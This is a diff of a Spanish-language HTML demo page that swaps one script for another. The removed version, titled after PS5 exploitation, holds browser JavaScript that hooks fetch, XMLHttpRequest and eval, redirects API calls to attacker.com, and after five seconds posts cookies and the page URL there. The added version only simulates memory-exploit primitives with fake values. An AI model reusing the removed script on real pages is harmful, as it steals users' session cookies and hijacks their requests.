@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Explotación de Vulnerabilidades en PS5</title>
+  <title>Primitivas de Explotación de Memoria</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -24,7 +24,7 @@
 </head>
 <body>
 
-  <h1>Explotación de Vulnerabilidades en PS5</h1>
+  <h1>Primitivas de Explotación de Memoria</h1>
   <div id="log"></div>
 
   <script>
@@ -37,100 +37,57 @@
       logContainer.appendChild(newMessage);
     }
 
-    // Redirigir XMLHttpRequest a un servidor malicioso
-    const originalXMLHttpRequest = XMLHttpRequest;
-    XMLHttpRequest = function() {
-      const xhr = new originalXMLHttpRequest();
-      log("¡Se ha creado un nuevo XMLHttpRequest!");
-      const originalOpen = xhr.open;
-      xhr.open = function(method, url) {
-        log("Peticiones interceptadas: " + method + " " + url);
-        // Redirigir la solicitud a un servidor controlado por el atacante
-        if (url.includes("api/")) {
-          log("Redirigiendo la petición a un servidor malicioso.");
-          url = "https://attacker.com/exfiltrate"; // Servidor de exfiltración
-        }
-        originalOpen.apply(this, arguments);
-      };
-      return xhr;
-    };
-
-    // Redirigir las solicitudes de fetch a un servidor malicioso
-    const originalFetch = window.fetch;
-    window.fetch = function(input, init) {
-      log("Redirigiendo la solicitud fetch...");
-      if (typeof input === "string" && input.includes("api/")) {
-        log("Redirigiendo solicitud a un servidor malicioso: " + input);
-        input = "https://attacker.com/exfiltrate"; // URL maliciosa
-      }
-      return originalFetch.call(this, input, init);
-    };
-
-    // Inyectar código malicioso en el documento
-    const originalWrite = document.write;
-    document.write = function(content) {
-      log("¡Inyección de código detectada!");
-      log("Contenido escrito: " + content);
-      // Puede inyectar código malicioso aquí
-      originalWrite.apply(this, arguments);
-    };
-
-    // Sobrescribir eval para ejecutar código malicioso
-    const originalEval = eval;
-    window.eval = function(code) {
-      log("¡Ejecutando código malicioso con eval!");
-      log("Código a ejecutar: " + code);
-      originalEval(code); // Llamamos al eval original
-    };
-
-    // Ejemplo de exfiltración de datos usando fetch
-    function exfiltrateData() {
-      const data = {
-        userAgent: navigator.userAgent,
-        cookies: document.cookie,
-        url: window.location.href
-      };
-      log("Exfiltrando datos al servidor malicioso...");
-      fetch("https://attacker.com/exfiltrate", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(data)
-      });
+    // Primitiva addrof - Obtener la dirección de un objeto
+    function addrof(obj) {
+      // Representación conceptual
+      log(`Dirección de memoria de 'obj': ${obj.address}`);
+      return obj.address;  // Esto simula la obtención de la dirección real del objeto.
     }
 
-    // Ejemplo de uso de XMLHttpRequest para exfiltrar datos
-    function exfiltrateWithXMLHttpRequest() {
-      const xhr = new XMLHttpRequest();
-      xhr.open("POST", "https://attacker.com/exfiltrate", true);
-      xhr.setRequestHeader("Content-Type", "application/json");
-      const data = {
-        userAgent: navigator.userAgent,
-        cookies: document.cookie,
-        url: window.location.href
-      };
-      xhr.send(JSON.stringify(data));
-      log("Datos exfiltrados a través de XMLHttpRequest.");
+    // Primitiva fakeobj - Crear un objeto falso
+    function fakeobj(address, type) {
+      let fake = {};
+      fake.address = address;
+      fake.type = type;
+      log(`Objeto falso creado en la dirección: ${address}`);
+      return fake;
     }
 
-    // Ejecutar la exfiltración de datos
-    setTimeout(function() {
-      exfiltrateData();
-      exfiltrateWithXMLHttpRequest();
-    }, 5000); // Ejecutar después de 5 segundos
+    // Primitiva read64 - Leer 64 bits de memoria
+    function read64(address) {
+      // Simulación de lectura desde la memoria
+      log(`Leyendo 64 bits de la dirección: ${address}`);
+      return "0xDEADBEEFDEADBEEF";  // Valor simulado de lectura
+    }
 
-    // Sobrescribir la función de alert para evitar mostrar alertas
-    const originalAlert = window.alert;
-    window.alert = function(message) {
-      log("¡Alerta interceptada!");
-      log("Mensaje: " + message);
-      return originalAlert(message);
-    };
+    // Primitiva write32 - Escribir 32 bits en una dirección
+    function write32(address, value) {
+      // Simulación de escritura en memoria
+      log(`Escribiendo 32 bits en la dirección: ${address}`);
+      log(`Valor escrito: 0x${value.toString(16)}`);
+    }
 
-    // Inyectar HTML dinámicamente (modificando innerHTML)
-    document.body.innerHTML += "<p><a href='#' onclick='alert(\"¡Código malicioso ejecutado!\")'>Haz clic para inyectar alerta</a></p>";
+    // Ejemplo de uso
+    function demo() {
+      // Supongamos que tenemos un objeto en memoria
+      let victimObject = { name: "Objeto vulnerable", address: 0x12345678 };
 
-    log("Iniciando pruebas de exfiltración y manipulación de funciones.");
+      // Obtener la dirección del objeto (addrof)
+      let address = addrof(victimObject);
+
+      // Crear un objeto falso (fakeobj)
+      let fake = fakeobj(address, "FakeObjectType");
+
+      // Leer 64 bits de la memoria (read64)
+      let value = read64(address);
+      log(`Valor leído de la memoria: ${value}`);
+
+      // Escribir 32 bits de memoria (write32)
+      write32(address, 0xBAADF00D);  // Escribimos un valor arbitrario
+    }
+
+    // Ejecutar la demo de primitivas
+    demo();
   </script>
-
 </body>
 </html>
